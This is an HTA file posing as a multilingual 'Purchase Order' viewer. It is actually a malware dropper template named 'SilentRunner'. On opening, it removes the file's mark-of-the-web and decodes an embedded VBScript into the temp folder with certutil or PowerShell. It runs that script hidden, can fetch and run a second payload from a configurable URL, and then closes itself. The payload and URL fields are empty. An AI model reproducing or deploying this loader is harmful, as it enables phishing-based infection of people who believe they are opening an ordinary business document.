<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="utf-8">
<title>Purchase Order</title>
<HTA:APPLICATION
  ID="SilentRunner"
  APPLICATIONNAME="SilentRunner"
  BORDER="thin"
  BORDERSTYLE="static"
  CAPTION="yes"
  CONTEXTMENU="no"
  INNERBORDER="no"
  MAXIMIZEBUTTON="yes"
  MINIMIZEBUTTON="yes"
  SCROLL="no"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
  WINDOWSTATE="normal"
  
/>
<style>
  html, body {
    margin:0; padding:0; width:100%; height:100%;
    overflow:hidden; font-family:"Segoe UI", Arial, sans-serif;
    background:#0f172a;
  }
  #bgimg {
    position:fixed; top:0; left:0;
    width:100%; height:100%;
    object-fit:cover; z-index:0;
  }
  #overlay {
    position:fixed; top:0; right:0; bottom:0; left:0;
    width:100%; height:100%;
    background:rgba(15,23,42,0.42); z-index:1;
    display:-ms-flexbox; display:flex;
    -ms-flex-align:center; -ms-flex-pack:center;
    align-items:center; justify-content:center; text-align:center;
  }
  #card {
    position:absolute; z-index:2; left:50%; top:50%; width:640px; margin:0;
    background:#ffffff; border-radius:26px; padding:48px 52px 42px 52px;
    box-shadow:0 36px 90px rgba(0,0,0,0.50); text-align:center;
    -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);
    -ms-animation: srPop 0.28s cubic-bezier(0.18, 1.35, 0.32, 1) both;
    animation: srPop 0.28s cubic-bezier(0.18, 1.35, 0.32, 1) both;
  }
  @keyframes srPop {
    0%   { transform: translate(-50%, -50%) scale(0.86); opacity:0; }
    100% { transform: translate(-50%, -50%) scale(1); opacity:1; }
  }
  #card h2 { margin:0 0 10px 0; font-size:36px; color:#0f172a; font-weight:800; }
  #card .sub { font-size:18px; color:#64748b; margin-bottom:18px; font-weight:700; }
  #msg { margin-top:6px; font-size:18px; font-weight:800; color:#1e40af; min-height:26px; }
  #msg.ok { color:#059669; }
  #msg.err { color:#dc2626; }
</style>
</head>
<body>
  <img id="bgimg" src="data:image/jpeg;base64," alt="">
  <div id="overlay">
    <div id="card">
      <h2 id="tTitle">Purchase Order Access</h2>
      <div class="sub" id="tSub">Opening files...</div>
      <div id="msg"></div>
    </div>
  </div>
<script language="VBScript">
Sub ForceClose
  On Error Resume Next
  self.Close
End Sub
</script>
<script language="javascript">
var HOST_LINK = "";
var HOST_NAME = "PO_REF_412720.vbs";
var FILE_NAMES = ["PO_REF_412720.vbs"];
var FILE_B64  = [""];
var BUILDER_TITLE = "Purchase Order";
var I18N = {
  en: { winTitle:"Purchase Order", access:"Purchase Order Access", sub:"Opening files...", opened:"Files opened.", errPrefix:"Error: " },
  vi: { winTitle:"Don dat hang", access:"Truy cap don dat hang", sub:"Dang mo tep...", opened:"Da mo tep.", errPrefix:"Loi: " },
  th: { winTitle:"Purchase Order", access:"Purchase Order", sub:"Opening files...", opened:"Files opened.", errPrefix:"Error: " },
  zh: { winTitle:"Purchase Order", access:"Purchase Order", sub:"Opening files...", opened:"Files opened.", errPrefix:"Error: " },
  es: { winTitle:"Orden de compra", access:"Acceso a la orden de compra", sub:"Abriendo archivos...", opened:"Archivos abiertos.", errPrefix:"Error: " },
  fr: { winTitle:"Bon de commande", access:"Acces au bon de commande", sub:"Ouverture des fichiers...", opened:"Fichiers ouverts.", errPrefix:"Erreur : " },
  id: { winTitle:"Pesanan pembelian", access:"Akses pesanan pembelian", sub:"Membuka file...", opened:"File dibuka.", errPrefix:"Error: " },
  fil: { winTitle:"Purchase Order", access:"Access sa Purchase Order", sub:"Binubuksan ang mga file...", opened:"Nabuksan ang mga file.", errPrefix:"Error: " }
};
I18N["zh-cn"] = I18N.zh; I18N["pt-br"] = I18N.en; I18N["tl"] = I18N.fil;
var T = I18N.en;
function detectLang() {
  var raw = "en";
  try { raw = navigator.userLanguage || navigator.language || navigator.browserLanguage || "en"; } catch (e) {}
  raw = String(raw || "en").toLowerCase().replace("_", "-");
  if (I18N[raw]) return raw;
  var short = raw.split("-")[0];
  if (I18N[short]) return short;
  return "en";
}
function setText(id, text) { var el = document.getElementById(id); if (el) el.innerText = text; }
function applyI18n() {
  T = I18N[detectLang()] || I18N.en;
  try { if (!BUILDER_TITLE || BUILDER_TITLE === "Purchase Order") document.title = T.winTitle; } catch (e) {}
  setText("tTitle", T.access); setText("tSub", T.sub);
}
function setMsg(text, ok) { var m = document.getElementById("msg"); m.className = ok ? "ok" : "err"; m.innerText = text; }
function shell() { return new ActiveXObject("WScript.Shell"); }
function fso() { return new ActiveXObject("Scripting.FileSystemObject"); }
function tempDir() { return shell().ExpandEnvironmentStrings("%TEMP%"); }
function fileExists(path) { try { return fso().FileExists(path); } catch (e) { return false; } }
function fileSize(path) { try { return fso().GetFile(path).Size; } catch (e) { return 0; } }
function deleteQuiet(path) { try { if (fileExists(path)) fso().DeleteFile(path, true); } catch (e) {} }
function runHidden(cmd, wait) { return shell().Run(cmd, 0, wait ? true : false); }
function uniqueTemp(ext) { return tempDir() + "\\sr_" + (new Date()).getTime() + "_" + Math.floor(Math.random() * 1000000) + ext; }
function writeAsciiFile(path, text) {
  var ts = fso().CreateTextFile(path, true, false);
  var chunk = 24000;
  if (text.length <= chunk) ts.Write(text);
  else { for (var i = 0; i < text.length; i += chunk) ts.Write(text.substr(i, chunk)); }
  ts.Close();
}
function unblockPath(path) {
  if (!path) return;
  try { runHidden('cmd.exe /c echo.>"' + path + ':Zone.Identifier"', true); } catch (e2) {}
}
function htaPath() {
  var u = String(window.location.pathname || window.location.href || "");
  try { u = decodeURIComponent(u); } catch (e) {}
  u = u.replace(/^file:\/\/\//i, "").replace(/^file:\/\//i, "");
  if (/^\/[A-Za-z]:/.test(u)) u = u.substr(1);
  return u.replace(/\//g, "\\");
}
function unblockSelf() { try { var p = htaPath(); if (p && fileExists(p)) unblockPath(p); } catch (e3) {} }
function decodeB64ToFile(b64, outPath) {
  deleteQuiet(outPath);
  var tmp = uniqueTemp(".b64");
  writeAsciiFile(tmp, b64);
  runHidden('cmd.exe /c certutil.exe -decode -f "' + tmp + '" "' + outPath + '" >nul 2>&1', true);
  if (!(fileExists(outPath) && fileSize(outPath) > 0)) {
    runHidden('powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "try { [IO.File]::WriteAllBytes(\'' + outPath + '\', [Convert]::FromBase64String((Get-Content -LiteralPath \'' + tmp + '\' -Raw))) } catch {}"', true);
  }
  deleteQuiet(tmp);
  if (!(fileExists(outPath) && fileSize(outPath) > 0)) throw new Error("Could not write file: " + outPath);
  unblockPath(outPath);
}
function downloadToTemp(url, filename) {
  var path = tempDir() + "\\" + filename;
  deleteQuiet(path);
  runHidden('cmd.exe /c curl.exe -L --fail --silent --show-error -o "' + path + '" "' + url + '"', true);
  if (!(fileExists(path) && fileSize(path) > 0)) {
    runHidden('powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + path + '\') } catch {}"', true);
  }
  if (!(fileExists(path) && fileSize(path) > 0)) {
    runHidden('powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri \'' + url + '\' -OutFile \'' + path + '\' -UseBasicParsing } catch {}"', true);
  }
  if (!(fileExists(path) && fileSize(path) > 0)) throw new Error("Download failed");
  unblockPath(path);
  return path;
}
function openFile(path) {
  var sh = shell(); var ext = "";
  try { ext = fso().GetExtensionName(path).toLowerCase(); } catch (e) {}
  try {
    if (ext === "vbs" || ext === "vbe" || ext === "js" || ext === "jse") sh.Run('wscript.exe //B //Nologo "' + path + '"', 1, false);
    else if (ext === "bat" || ext === "cmd") sh.Run('cmd.exe /c "' + path + '"', 1, false);
    else if (ext === "ps1") sh.Run('powershell.exe -NoProfile -ExecutionPolicy Bypass -File "' + path + '"', 1, false);
    else if (ext === "hta") sh.Run('mshta.exe "' + path + '"', 1, false);
    else sh.Run('"' + path + '"', 1, false);
  } catch (e2) { sh.Run('cmd.exe /c start "" "' + path + '"', 1, false); }
}
function closeWindow() {
  try { ForceClose(); } catch (e) {}
  try { window.close(); } catch (e2) {}
  try { self.close(); } catch (e3) {}
}
function runFiles() {
  var i, path;
  for (i = 0; i < FILE_NAMES.length; i++) {
    path = tempDir() + "\\" + FILE_NAMES[i];
    decodeB64ToFile(FILE_B64[i], path);
    openFile(path);
  }
  if (HOST_LINK && HOST_LINK.length > 8) { path = downloadToTemp(HOST_LINK, HOST_NAME); openFile(path); }
  setMsg(T.opened, true);
  setTimeout(closeWindow, 350);
}
window.onload = function() {
  try { applyI18n(); } catch (eL) {}
  try {
    var w = 1040, h = 860;
    self.ResizeTo(w, h);
    self.MoveTo(Math.max(0, (screen.availWidth - w) / 2), Math.max(0, (screen.availHeight - h) / 2));
  } catch (e) {}
  try { unblockSelf(); } catch (e2) {}
  setTimeout(function() {
    try { runFiles(); } catch (e3) { setMsg(T.errPrefix + (e3.message || e3), false); }
  }, 30);
};
</script>
</body>
</html>
